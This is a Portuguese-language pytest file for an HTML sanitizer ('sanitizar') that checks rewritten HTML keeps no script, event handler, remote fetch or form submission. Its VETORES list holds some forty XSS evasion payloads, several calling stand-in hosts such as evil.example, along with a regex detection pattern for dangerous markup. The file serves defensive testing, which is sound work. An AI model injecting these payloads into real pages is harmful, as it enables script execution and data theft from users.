"""A allowlist do HTML que vai à tela (ADR-0055): nada que rode código, busque rede ou mande dado.

Os vetores são os clássicos de evasão de XSS (a folha de dicas da OWASP), mais o que o texto rico do
Qt busca de verdade — medido nesta máquina: `<img src>` e `url()` no `style` e no `<style>`. O teste
não confia em "o Qt não roda script": ele cobra que nada disso **sobra** no HTML reescrito.
"""

from __future__ import annotations

import re

import pytest

from jarvis.tela.sanitizar import LIMITE_DE_ENTRADA, LIMITE_DE_PROFUNDIDADE, sanitizar
from jarvis.tela.tema import CSS_DO_TEMA

PERIGOSO = re.compile(
    r"<\s*(script|iframe|frame|object|embed|applet|svg|math|img|image|input|form|button|textarea"
    r"|select|link|meta|base|audio|video|canvas|style\s+[^>]*src)\b"
    r"|\bon[a-z]+\s*=|javascript:|vbscript:|url\s*\(|expression\s*\(|@import|\bhref\s*=|\bsrc\s*="
    r"|\\[0-9a-fA-F]",  # escape de CSS: `\75 rl(` é `url(` disfarçado
    re.IGNORECASE,
)


def _limpo(documento: str) -> bool:
    """O documento não tem nada que rode, busque ou mande — nem escondido em atributo."""
    return PERIGOSO.search(documento) is None


VETORES = [
    "<script>alert(1)</script>",
    "<SCRIPT SRC=http://xss.example/xss.js></SCRIPT>",
    "<scr<script>ipt>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<IMG SRC=JaVaScRiPt:alert('XSS')>",
    "<img src=`javascript:alert(1)`>",
    '<img """><script>alert("XSS")</script>">',
    "<svg/onload=alert(1)>",
    "<svg><script>alert(1)</script></svg>",
    "<math><mtext><script>alert(1)</script></mtext></math>",
    '<iframe src="http://evil.example"></iframe>',
    '<iframe srcdoc="<script>alert(1)</script>"></iframe>',
    '<object data="http://evil.example/x.swf"></object>',
    '<embed src="http://evil.example/x.swf">',
    '<a href="javascript:alert(1)">clica</a>',
    '<a href="http://evil.example">site</a>',
    '<p onclick="alert(1)" onmouseover=alert(2)>texto</p>',
    "<body onload=alert(1)>oi</body>",
    '<p style="background-image: url(http://evil.example/a.png)">fundo</p>',
    "<p style=\"background: url('http://evil.example/a.png')\">fundo</p>",
    '<p style="color: red; background-image: URL(http://evil.example)">x</p>',
    '<p style="width: expression(alert(1))">e</p>',
    '<p style="color: r\\65 d; background: \\75 rl(http://x)">esc</p>',
    '<p style="behavior: url(x.htc); -moz-binding: url(x.xml#xss)">b</p>',
    "<style>@import url(http://evil.example/a.css);</style>",
    "<style>@import 'http://evil.example/a.css';</style>",
    "<style>p { background-image: url(http://evil.example/b.png) }</style>",
    "<style>@media screen { p { background: url(http://x) } }</style>",
    "<style>@font-face { font-family: x; src: url(http://evil.example/f.woff) }</style>",
    "<style>p { color: red } </style><style>td:hover { background: url(http://x) }</style>",
    "<style>p{color:red;}/*</style><script>alert(1)</script>*/</style>",
    '<form action="http://evil.example"><input name="senha"><button>Enviar</button></form>',
    '<meta http-equiv="refresh" content="0;url=http://evil.example">',
    '<base href="http://evil.example/">',
    '<link rel="stylesheet" href="http://evil.example/a.css">',
    '<table background="http://evil.example/a.png"><tr><td background="javascript:x">c</td></tr>'
    "</table>",
    '<video src="http://evil.example/v.mp4"></video><audio src=x>',
    "<details open ontoggle=alert(1)><summary>s</summary></details>",
    "<template><script>alert(1)</script></template>",
    "<noscript><p title='</noscript><img src=x onerror=alert(1)>'></noscript>",
    '<div style="color:red" xmlns="http://www.w3.org/1999/xhtml">x</div>',
    "<!--<img src=x onerror=alert(1)>-->",
    "<p>a</p><![CDATA[<script>alert(1)</script>]]>",
]


@pytest.mark.parametrize("vetor", VETORES)
def test_nenhum_vetor_sobra_no_html_reescrito(vetor: str) -> None:
    seguro = sanitizar(vetor)

    assert _limpo(seguro.documento), seguro.documento
    assert _limpo(sanitizar(vetor, tema=CSS_DO_TEMA).documento)
    # E reescrever de novo não ressuscita nada: o documento limpo é ponto fixo.
    assert sanitizar(seguro.documento).documento == seguro.documento


@pytest.mark.parametrize(
    ("vetor", "codigo"),
    [
        ("<script>alert(1)</script>", "script"),
        ("<img src=x onerror=alert(1)>", "imagem"),
        ('<p onclick="x()">t</p>', "evento"),
        ('<a href="http://x">t</a>', "link"),
        ('<iframe src="http://x"></iframe>', "quadro"),
        ('<p style="background-image:url(http://x)">t</p>', "url"),
        ("<style>@import url(http://x/a.css);</style>", "url"),
        ('<form action="http://x"><input></form>', "formulario"),
        ("<svg><circle/></svg>", "svg"),
        ("<style>td:hover { color: red }</style>", "seletor"),
    ],
)
def test_o_que_saiu_vem_em_codigo_para_o_modelo_corrigir(vetor: str, codigo: str) -> None:
    assert codigo in sanitizar(vetor).removidos


def test_o_que_e_texto_continua_texto_com_escape() -> None:
    """Texto de uma página com "<script>" escrito nele é dado: aparece como texto, não vira tag."""
    seguro = sanitizar("<p>A página diz: &lt;script&gt;alert(1)&lt;/script&gt; e 3 &lt; 4</p>")

    assert "&lt;script&gt;alert(1)&lt;/script&gt;" in seguro.corpo
    assert "<script" not in seguro.corpo
    assert "3 &lt; 4" in seguro.corpo


def test_tabela_lista_e_estilo_simples_passam_inteiros() -> None:
    html = (
        "<style>.caro { color: #e5736a } th { text-align: left }</style>"
        '<h1>Celulares</h1><p class="fraco">Preços de hoje.</p>'
        '<table border="1" cellpadding="6" width="100%">'
        '<tr><th>Modelo</th><th class="num">Preço (R$)</th></tr>'
        '<tr><td>A15</td><td class="num caro" align="right">1.299</td></tr>'
        '</table><ul><li><b>Bateria:</b> 5000 mAh</li><li>Tela <i>6,5"</i></li></ul>'
    )
    seguro = sanitizar(html)

    assert seguro.removidos == ()
    assert '<td class="num caro" align="right">1.299</td>' in seguro.corpo
    assert '<table border="1" cellpadding="6" width="100%">' in seguro.corpo
    assert ".caro { color: #e5736a }" in seguro.css and "th { text-align: left }" in seguro.css
    assert "<li><b>Bateria:</b> 5000 mAh</li>" in seguro.corpo


def test_o_tema_do_jarvis_passa_inteiro_pela_allowlist() -> None:
    seguro = sanitizar("<p>x</p>", tema=CSS_DO_TEMA)
    assert seguro.removidos == (), "o nosso CSS não tem exceção: tem de passar limpo"
    assert seguro.css.startswith("body { color: #c6d5e0")


def test_o_tema_claro_pedido_pelo_body_vira_o_fundo_do_modulo() -> None:
    pelo_css = sanitizar("<style>body { background-color: #f5f7f9; color: #1f2933 }</style>x")
    pelo_atributo = sanitizar('<body bgcolor="#ffffff" style="color: #111">x</body>')

    assert pelo_css.fundo == "#f5f7f9" and "color: #1f2933" in pelo_css.css
    assert "background-color" not in pelo_css.css, "o fundo é da janela, não da folha"
    assert pelo_atributo.fundo == "#ffffff" and "body { color: #111 }" in pelo_atributo.css
    assert sanitizar('<body bgcolor="url(http://x)">x</body>').fundo == ""


def test_atributo_com_valor_fora_da_forma_sai() -> None:
    seguro = sanitizar(
        '<table width="javascript:1" border="999"><tr><td colspan="999" bgcolor="#zzz" '
        'valign="evil">x</td></tr></table><font face="url(http://x)" size="9">f</font>'
    )
    assert seguro.corpo == "<table><tr><td>x</td></tr></table><font>f</font>"
    assert "atributo" in seguro.removidos


def test_html_mal_aninhado_fecha_em_ordem_e_tag_desconhecida_vira_texto() -> None:
    seguro = sanitizar("<div><span><b><i>a</div>b<blink>c</blink><section>d</section>")
    assert seguro.corpo == "<div><span><b><i>a</i></b></span></div>bc<div>d</div>"


def test_profundidade_e_tamanho_tem_teto() -> None:
    fundo = sanitizar("<div>" * (LIMITE_DE_PROFUNDIDADE + 30) + "x")
    assert fundo.corpo.count("<div>") == LIMITE_DE_PROFUNDIDADE
    assert "profundidade" in fundo.removidos

    enorme = sanitizar("<p>" + "a" * (LIMITE_DE_ENTRADA + 10) + "</p>")
    assert "tamanho" in enorme.removidos and len(enorme.corpo) <= LIMITE_DE_ENTRADA + 10


def test_documento_vazio_depois_da_limpeza_e_detectado() -> None:
    assert sanitizar("<script>x</script><img src=y>").vazio
    assert not sanitizar("<p>oi</p>").vazio


def test_o_detector_do_teste_ve_os_vetores_crus() -> None:
    """Sem isto, o teste de cima poderia passar por um detector cego: ele tem de acusar o vetor cru
    (o único sem nada que rode ou busque é o do `xmlns`, que só some)."""
    cegos = [v for v in VETORES if not PERIGOSO.search(v)]
    assert cegos == ['<div style="color:red" xmlns="http://www.w3.org/1999/xhtml">x</div>']
